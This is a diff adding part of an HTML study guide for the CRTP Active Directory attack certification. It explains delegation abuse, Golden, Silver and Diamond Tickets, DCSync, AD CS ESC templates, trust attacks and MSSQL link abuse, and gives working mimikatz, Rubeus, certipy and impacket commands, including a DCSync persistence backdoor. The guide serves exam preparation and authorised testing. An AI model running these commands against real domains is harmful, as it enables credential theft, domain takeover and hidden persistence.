+          <p class="def"><b>OverPass‑the‑Hash:</b> Use an NTLM hash to request a real Kerberos TGT for that user, converting an NTLM credential into a full Kerberos identity (useful once a network is Kerberos‑only).</p>
+          <pre><span class="c1"># Pass-the-Hash</span>
+mimikatz # sekurlsa::pth /user:jdoe /domain:corp.local /ntlm:&lt;hash&gt; /run:cmd.exe
+
+<span class="c1"># OverPass-the-Hash with Rubeus</span>
+Rubeus.exe asktgt /user:jdoe /domain:corp.local /rc4:&lt;hash&gt; /ptt</pre>
+          <div class="toolbox">
+            <a class="tool-pill" href="https://github.com/gentilkiwi/mimikatz" target="_blank"><span class="dot"></span>Mimikatz</a>
+            <a class="tool-pill" href="https://github.com/GhostPack/Rubeus" target="_blank"><span class="dot"></span>Rubeus</a>
+          </div>
+        </div>
+      </details>
+    </section>
+
+    <!-- ============ PHASE 5: DOMAIN PRIVESC ============ -->
+    <section id="privescphase">
+      <div class="phase-head"><span class="tag">PHASE 5</span><h2>Domain Privilege Escalation</h2></div>
+      <p class="phase-desc">The core of the CRTP exam: abuse Kerberos delegation, forge tickets, and pull the keys to the kingdom (krbtgt) from the DC.</p>
+
+      <details id="delegation">
+        <summary><span class="idx">3.21–3.24, 3.25</span>Delegation Attacks (Unconstrained, Constrained, RBCD, S4U2Self)</summary>
+        <div class="body">
+          <p class="def"><b>Kerberos delegation</b> lets a service impersonate a user to reach a second service on their behalf — e.g. a web server impersonating you to query a backend database. Misconfigured delegation is one of the highest‑value AD privesc paths.</p>
+          <table>
+            <tr><th>Type</th><th>How it works</th><th>Abuse</th></tr>
+            <tr><td>Unconstrained Delegation</td><td>Server can impersonate <i>any</i> user to <i>any</i> service</td><td>Wait for/force a Domain Admin to connect → steal their TGT from memory → DCSync</td></tr>
+            <tr><td>Constrained Delegation (w/ protocol transition)</td><td>Server can impersonate any user, but only to specific listed services</td><td>S4U2Self + S4U2Proxy to mint a ticket as any user, to an allowed service</td></tr>
+            <tr><td>Constrained Delegation (no protocol transition)</td><td>Same, but requires the user's real TGT first</td><td>Need a Kerberos‑authenticated session, then S4U2Proxy</td></tr>
+            <tr><td>Resource‑Based Constrained Delegation (RBCD)</td><td>The <i>target</i> resource decides who can delegate to it (msDS‑AllowedToActOnBehalfOfOtherIdentity)</td><td>If you can write that attribute on a computer object, you can delegate to it as anyone — including a DA</td></tr>
+          </table>
+          <pre><span class="c1"># find unconstrained delegation hosts</span>
+Get-DomainComputer -Unconstrained
+
+<span class="c1"># RBCD: you have GenericWrite on a computer object -&gt; add a fake computer as "allowed"</span>
+New-MachineAccount -MachineAccount evilpc -Password (ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)
+Set-DomainComputer -Identity TargetPC -Rawattribute msDS-AllowedToActOnBehalfOfOtherIdentity -value &lt;raw SD bytes for evilpc&gt;
+
+Rubeus.exe s4u /user:evilpc$ /rc4:&lt;hash&gt; /impersonateuser:Administrator /msdsspn:cifs/targetpc.corp.local /ptt</pre>
+          <p class="ex"><b>Example:</b> A print server has unconstrained delegation enabled (a classic legacy misconfig). Forcing the DC to authenticate to it (via the printer bug or a coerced SMB connection) captures the DC's own TGT in memory — game over for the domain.</p>
+          <div class="toolbox">
+            <a class="tool-pill" href="https://github.com/GhostPack/Rubeus" target="_blank"><span class="dot"></span>Rubeus</a>
+            <a class="tool-pill" href="https://github.com/Kevin-Robertson/Powermad" target="_blank"><span class="dot"></span>Powermad</a>
+            <a class="tool-pill" href="https://github.com/topotam/PetitPotam" target="_blank"><span class="dot"></span>PetitPotam (coercion)</a>
+          </div>
+        </div>
+      </details>
+
+      <details id="tickets">
+        <summary><span class="idx">3.26–28</span>Golden / Silver / Diamond Tickets</summary>
+        <div class="body">
+          <p class="def"><b>Golden Ticket:</b> Forge a TGT from scratch using the domain's krbtgt account hash. Since the krbtgt account signs every Kerberos ticket in the domain, owning its hash means you can mint a "ticket" for any user (even one that doesn't exist) with any group memberships, valid until you change the krbtgt password (twice).</p>
+          <p class="def"><b>Silver Ticket:</b> Same idea but forged using a specific <i>service</i> account's hash instead of krbtgt — grants access only to that one service, but doesn't need DC contact and is stealthier.</p>
+          <p class="def"><b>Diamond Ticket:</b> Take a <i>real</i> TGT issued by the DC and modify its fields (e.g. group memberships) in‑place, re‑encrypting with the krbtgt key — harder to detect than a Golden Ticket because the ticket's other metadata looks legitimate.</p>
+          <pre><span class="c1"># Golden Ticket</span>
+mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:&lt;domain SID&gt; /krbtgt:&lt;krbtgt hash&gt; /ptt
+
+<span class="c1"># Silver Ticket (for a CIFS service on a target server)</span>
+mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:&lt;domain SID&gt; /target:fileserver.corp.local /service:cifs /rc4:&lt;service acct hash&gt; /ptt</pre>
+          <div class="toolbox">
+            <a class="tool-pill" href="https://github.com/gentilkiwi/mimikatz" target="_blank"><span class="dot"></span>Mimikatz</a>
+            <a class="tool-pill" href="https://github.com/GhostPack/Rubeus" target="_blank"><span class="dot"></span>Rubeus</a>
+          </div>
+        </div>
+      </details>
+
+      <details id="dcsync">
+        <summary><span class="idx">3.21.1, 3.29–30</span>DCSync · Domain DPAPI Backup Key · Granting DCSync</summary>
+        <div class="body">
+          <p class="def"><b>DCSync:</b> Domain Controllers normally replicate password hashes to each other using a replication protocol (MS‑DRSR). DCSync abuses this by impersonating a Domain Controller and asking a real DC to "replicate" any account's hash to you — including krbtgt — without ever touching LSASS on the DC itself.</p>
+          <p><b>Requires:</b> the rights <span class="inline-code">DS-Replication-Get-Changes</span> and <span class="inline-code">DS-Replication-Get-Changes-All</span> on the domain object (normally only Domain Admins / Enterprise Admins / DCs have these — but they can be granted to a lower account by mistake, or deliberately as a persistence backdoor).</p>
+          <pre>mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
+impacket-secretsdump corp.local/jdoe:pass@10.10.10.10 -just-dc-ntlm
+
+<span class="c1"># Backdoor: grant DCSync rights to a low-priv user (persistence)</span>
+Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity jdoe -Rights DCSync</pre>
+          <p class="def"><b>DPAPI Domain Backup Key:</b> DPAPI encrypts secrets (saved browser passwords, RDP creds) using a key tied to the user — but the domain holds a master backup key so any of those secrets can be decrypted by anyone with that key, regardless of whose account encrypted them.</p>
+          <pre>mimikatz # lsadump::backupkeys /system:dc01.corp.local /export</pre>
+          <div class="toolbox">
+            <a class="tool-pill" href="https://github.com/fortra/impacket" target="_blank"><span class="dot"></span>impacket (secretsdump)</a>
+            <a class="tool-pill" href="https://github.com/gentilkiwi/mimikatz" target="_blank"><span class="dot"></span>Mimikatz</a>
+          </div>
+        </div>
+      </details>
+
+      <details id="gmsa">
+        <summary><span class="idx">3.20</span>Read gMSA Password</summary>
+        <div class="body">
+          <p class="def"><b>Definition:</b> A Group Managed Service Account (gMSA) is a service account whose password is auto‑rotated and managed by AD itself. Any principal listed in its <span class="inline-code">PrincipalsAllowedToRetrieveManagedPassword</span> attribute can read that password directly from LDAP — no cracking required.</p>
+          <pre>Get-ADServiceAccount -Identity svc-gmsa -Properties PrincipalsAllowedToRetrieveManagedPassword
+<span class="c1"># Pull and convert to NTLM with GMSAPasswordReader / DSInternals</span>
+Get-ADServiceAccount svc-gmsa -Properties msDS-ManagedPassword | ConvertFrom-ADManagedPasswordBlob</pre>
+          <div class="toolbox">
+            <a class="tool-pill" href="https://github.com/rvazarkar/GMSAPasswordReader" target="_blank"><span class="dot"></span>GMSAPasswordReader</a>
+            <a class="tool-pill" href="https://github.com/MichaelGrafnetter/DSInternals" target="_blank"><span class="dot"></span>DSInternals</a>
+          </div>
+        </div>
+      </details>
+    </section>
+
+    <!-- ============ PHASE 6: BEYOND THE DOMAIN ============ -->
+    <section id="beyondphase">
+      <div class="phase-head"><span class="tag">PHASE 6 · advanced (CRTE territory)</span><h2>Beyond the Domain</h2></div>
+      <p class="phase-desc">These topics extend past the core CRTP syllabus into CRTE‑style content: certificate services, cross‑trust pivoting, and database links.</p>
+
+      <details id="adcs">
+        <summary><span class="idx">3.31</span>Active Directory Certificate Services — ESC1 to ESC15</summary>
+        <div class="body">
+          <p class="def"><b>Definition:</b> AD CS issues digital certificates that can be used to authenticate as a user (sometimes even more powerfully than a password — a cert doesn't expire on its own and bypasses some MFA). Misconfigured certificate templates ("ESC" = Escalation) let low‑privileged users request certificates that let them impersonate anyone, including Domain Admins.</p>
+          <table>
+            <tr><th>ID</th><th>Root cause (short)</th></tr>
+            <tr><td>ESC1</td><td>Template lets requester supply any Subject Alternative Name (SAN) → request a cert "as" any user</td></tr>
+            <tr><td>ESC2</td><td>Template allows "Any Purpose" or no EKU restriction</td></tr>
+            <tr><td>ESC3</td><td>Template grants the "Certificate Request Agent" enrollment agent role abusively</td></tr>
+            <tr><td>ESC4</td><td>Low‑priv user has write access to the template object itself → reconfigure it to be ESC1‑like</td></tr>
+            <tr><td>ESC5</td><td>Write access to the CA object / its container in AD</td></tr>
+            <tr><td>ESC6</td><td>CA‑wide flag <span class="inline-code">EDITF_ATTRIBUTESUBJECTALTNAME2</span> lets any template accept attacker‑supplied SAN</td></tr>
+            <tr><td>ESC7</td><td>Low‑priv user holds CA management rights (Manage CA / Manage Certificates)</td></tr>
+            <tr><td>ESC8</td><td>CA web enrollment (HTTP) is vulnerable to NTLM relay</td></tr>
+            <tr><td>ESC9/10</td><td>Certificate mapping / weak‑mapping downgrade issues (no security extension, UPN mismatch)</td></tr>
+            <tr><td>ESC11</td><td>RPC encryption not enforced on the CA → relay over RPC</td></tr>
+            <tr><td>ESC12/13/14/15</td><td>Newer issues: YubiHSM key storage permissions, OID group‑linked templates, weak/empty SAN, and version‑4 template downgrade (2024+ research)</td></tr>
+          </table>
+          <pre>certipy find -u user@corp.local -p pass -dc-ip 10.10.10.10 -vulnerable
+<span class="c1"># ESC1 example: request a cert as Administrator via a vulnerable template</span>
+certipy req -u user@corp.local -p pass -ca CORP-CA -target dc01.corp.local -template VulnTemplate -upn administrator@corp.local
+certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10</pre>
+          <div class="toolbox">
+            <a class="tool-pill" href="https://github.com/ly4k/Certipy" target="_blank"><span class="dot"></span>Certipy</a>
+            <a class="tool-pill" href="https://github.com/GhostPack/Certify" target="_blank"><span class="dot"></span>Certify</a>
+          </div>
+        </div>
+      </details>
+
+      <details id="trusts">
+        <summary><span class="idx">3.32–33</span>Domain &amp; Forest Trust Attacks</summary>
+        <div class="body">
+          <p class="def"><b>Definition:</b> A trust relationship has its own secret — the <b>trust key</b> — shared between the two domains' DCs, conceptually similar to krbtgt but for cross‑domain tickets (an "Inter‑Realm TGT"). If you compromise one side of a trust (or capture the trust key/krbtgt hash), you can forge tickets accepted on the other side.</p>
+          <pre><span class="c1"># dump the trust key from a compromised DC</span>
+mimikatz # lsadump::trust /patch
+
+<span class="c1"># forge an inter-realm TGT and request access on the trusting domain</span>
+mimikatz # kerberos::golden /user:Administrator /domain:child.corp.local /sid:&lt;child SID&gt; /sids:&lt;Enterprise Admins SID&gt; /rc4:&lt;trust key&gt; /service:krbtgt /target:corp.local /ticket:interrealm.kirbi</pre>
+          <p class="ex"><b>Example:</b> Compromising a child domain (<span class="inline-code">child.corp.local</span>) and abusing SID History / the trust key with the Enterprise Admins SID grants access back up to the forest root — the classic "child domain compromises the whole forest" path.</p>
+          <div class="toolbox">
+            <a class="tool-pill" href="https://github.com/gentilkiwi/mimikatz" target="_blank"><span class="dot"></span>Mimikatz</a>
+          </div>
+        </div>
+      </details>
+
+      <details id="mssql">
+        <summary><span class="idx">3.34</span>MSSQL — Logins, Impersonation, Trusted Links</summary>
+        <div class="body">
+          <p class="def"><b>Definition:</b> SQL Server has its own permission layer on top of Windows auth. "Impersonation" rights let one SQL login act as a higher‑privileged login on the same server; "Linked servers" connect one SQL Server to another, and if that link runs as a privileged account, you can run queries (and OS commands via <span class="inline-code">xp_cmdshell</span>) on the linked server too — sometimes chaining across several servers.</p>
+          <pre>impacket-mssqlclient corp.local/user:pass@10.10.10.20 -windows-auth
+SQL&gt; SELECT name FROM sys.server_principals;
+SQL&gt; EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin');
+SQL&gt; EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];</pre>
+          <p class="ex"><b>Example:</b> A low‑priv SQL login can impersonate <span class="inline-code">sa</span> on Server A, which has a trusted link to Server B (a Domain Controller running SQL for an inventory app) — letting commands run as SYSTEM on the DC itself.</p>
+          <div class="toolbox">
+            <a class="tool-pill" href="https://github.com/fortra/impacket" target="_blank"><span class="dot"></span>impacket (mssqlclient)</a>
+            <a class="tool-pill" href="https://github.com/NetSPI/PowerUpSQL" target="_blank"><span class="dot"></span>PowerUpSQL</a>
+          </div>
+        </div>
+      </details>
+    </section>
+
+    <!-- ============ TOOL INDEX ============ -->
+    <section id="toolbox-all">
+      <div class="phase-head"><span class="tag">REFERENCE</span><h2>Full Tool Index</h2></div>
+      <p class="phase-desc">Every tool referenced above, in one place, with the GitHub source.</p>
+      <table>
+        <tr><th>Tool</th><th>Purpose</th><th>Source</th></tr>
+        <tr><td>nmap</td><td>Port/service scanning</td><td><a href="https://github.com/nmap/nmap" target="_blank" style="color:var(--teal)">github.com/nmap/nmap</a></td></tr>
+        <tr><td>kerbrute</td><td>Username enum, AS‑REP, password spray</td><td><a href="https://github.com/ropnop/kerbrute" target="_blank" style="color:var(--teal)">github.com/ropnop/kerbrute</a></td></tr>
+        <tr><td>Impacket</td><td>AS‑REP/Kerberoast requests, secretsdump, mssqlclient</td><td><a href="https://github.com/fortra/impacket" target="_blank" style="color:var(--teal)">github.com/fortra/impacket</a></td></tr>
+        <tr><td>NetExec (CME successor)</td><td>Spraying, SMB/LDAP enum, BloodHound collection</td><td><a href="https://github.com/Pennyw0rth/NetExec" target="_blank" style="color:var(--teal)">github.com/Pennyw0rth/NetExec</a></td></tr>
+        <tr><td>hashcat</td><td>Offline hash cracking</td><td><a href="https://github.com/hashcat/hashcat" target="_blank" style="color:var(--teal)">github.com/hashcat/hashcat</a></td></tr>
+        <tr><td>PowerView (PowerSploit)</td><td>AD enumeration &amp; ACL abuse from PowerShell</td><td><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" style="color:var(--teal)">github.com/PowerShellMafia/PowerSploit</a></td></tr>
+        <tr><td>SharpHound / BloodHound CE</td><td>AD attack‑path graphing</td><td><a href="https://github.com/SpecterOps/BloodHound" target="_blank" style="color:var(--teal)">github.com/SpecterOps/BloodHound</a></td></tr>
+        <tr><td>RustHound-CE</td><td>Fast cross‑platform BloodHound collector</td><td><a href="https://github.com/g0h4n/RustHound-CE" target="_blank" style="color:var(--teal)">github.com/g0h4n/RustHound-CE</a></td></tr>
+        <tr><td>AD Miner</td><td>HTML risk report from BloodHound data</td><td><a href="https://github.com/Mazars-Tech/AD_Miner" target="_blank" style="color:var(--teal)">github.com/Mazars-Tech/AD_Miner</a></td></tr>
+        <tr><td>Mimikatz</td><td>Credential dumping, tickets, DCSync, DPAPI</td><td><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" style="color:var(--teal)">github.com/gentilkiwi/mimikatz</a></td></tr>
+        <tr><td>Rubeus</td><td>Kerberos ticket abuse (roast, s4u, ptt)</td><td><a href="https://github.com/GhostPack/Rubeus" target="_blank" style="color:var(--teal)">github.com/GhostPack/Rubeus</a></td></tr>
+        <tr><td>Evil-WinRM</td><td>Remote shell, LAPS reading</td><td><a href="https://github.com/Hackplayers/evil-winrm" target="_blank" style="color:var(--teal)">github.com/Hackplayers/evil-winrm</a></td></tr>
+        <tr><td>SharpGPOAbuse</td><td>Abuse writable GPOs</td><td><a href="https://github.com/FSecureLABS/SharpGPOAbuse" target="_blank" style="color:var(--teal)">github.com/FSecureLABS/SharpGPOAbuse</a></td></tr>
+        <tr><td>Powermad</td><td>Fake computer accounts (RBCD setup)</td><td><a href="https://github.com/Kevin-Robertson/Powermad" target="_blank" style="color:var(--teal)">github.com/Kevin-Robertson/Powermad</a></td></tr>
+        <tr><td>PetitPotam</td><td>Force authentication coercion</td><td><a href="https://github.com/topotam/PetitPotam" target="_blank" style="color:var(--teal)">github.com/topotam/PetitPotam</a></td></tr>
+        <tr><td>Certipy</td><td>AD CS / ESC1‑15 abuse</td><td><a href="https://github.com/ly4k/Certipy" target="_blank" style="color:var(--teal)">github.com/ly4k/Certipy</a></td></tr>
+        <tr><td>Certify</td><td>AD CS enumeration &amp; abuse (C#)</td><td><a href="https://github.com/GhostPack/Certify" target="_blank" style="color:var(--teal)">github.com/GhostPack/Certify</a></td></tr>
+        <tr><td>PowerUpSQL</td><td>MSSQL enumeration &amp; linked‑server abuse</td><td><a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" style="color:var(--teal)">github.com/NetSPI/PowerUpSQL</a></td></tr>
+        <tr><td>DSInternals / GMSAPasswordReader</td><td>Read gMSA managed passwords</td><td><a href="https://github.com/MichaelGrafnetter/DSInternals" target="_blank" style="color:var(--teal)">github.com/MichaelGrafnetter/DSInternals</a></td></tr>
+      </table>
+    </section>
+
+    <!-- ============ GLOSSARY ============ -->
+    <section id="glossary">
+      <div class="phase-head"><span class="tag">REFERENCE</span><h2>Glossary — terms you'll see constantly</h2></div>
+      <div class="glossary-grid">
+        <div class="gterm"><h4>Domain Controller (DC)</h4><p>The server holding the AD database and issuing Kerberos tickets. Compromising one DC's krbtgt = compromising the whole domain.</p></div>
+        <div class="gterm"><h4>SPN (Service Principal Name)</h4><p>A label like <span class="inline-code">MSSQLSvc/db01:1433</span> identifying which service an account runs — the basis of Kerberoasting.</p></div>
+        <div class="gterm"><h4>TGT / TGS</h4><p>Ticket Granting Ticket (proves who you are to the DC) vs Ticket Granting Service ticket (proves who you are to one specific service).</p></div>
+        <div class="gterm"><h4>krbtgt</h4><p>The special domain account whose password hash signs every Kerberos ticket in the domain. The ultimate target for a Golden Ticket.</p></div>
+        <div class="gterm"><h4>SID / SID History</h4><p>Security Identifier — a unique ID per account/group. SID History lets an account "remember" old SIDs (e.g. after a domain migration) — and can be abused to inherit privileges it shouldn't have.</p></div>
+        <div class="gterm"><h4>NTLM hash</h4><p>A hash of a password, usable directly for authentication (Pass‑the‑Hash) without ever knowing the plaintext.</p></div>
+        <div class="gterm"><h4>DACL / ACE</h4><p>Discretionary Access Control List — the set of Access Control Entries on an object that define who can do what to it.</p></div>
+        <div class="gterm"><h4>OU (Organizational Unit)</h4><p>A folder-like container in AD used to organize objects and apply Group Policy to a specific subset of users/computers.</p></div>
+        <div class="gterm"><h4>GPO</h4><p>Group Policy Object — a bundle of settings/scripts pushed automatically to every computer/user it's linked to.</p></div>
+        <div class="gterm"><h4>LAPS</h4><p>Local Administrator Password Solution — rotates and stores each machine's local admin password in AD.</p></div>
+        <div class="gterm"><h4>gMSA</h4><p>Group Managed Service Account — a service account with an AD‑rotated password, readable by authorized principals straight from LDAP.</p></div>
+        <div class="gterm"><h4>EKU</h4><p>Extended Key Usage — a field in a certificate defining what it can be used for (e.g. client authentication) — central to AD CS (ESC) attacks.</p></div>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<footer>
+  CRTP Field Guide — study companion built for personal exam prep. Always practice these techniques only in your own lab or an authorized assessment. Up next on your path: CRTE (cross‑forest, AD CS deep dive, Azure AD hybrid) and beyond.
+</footer>
+
+</body>
+</html>
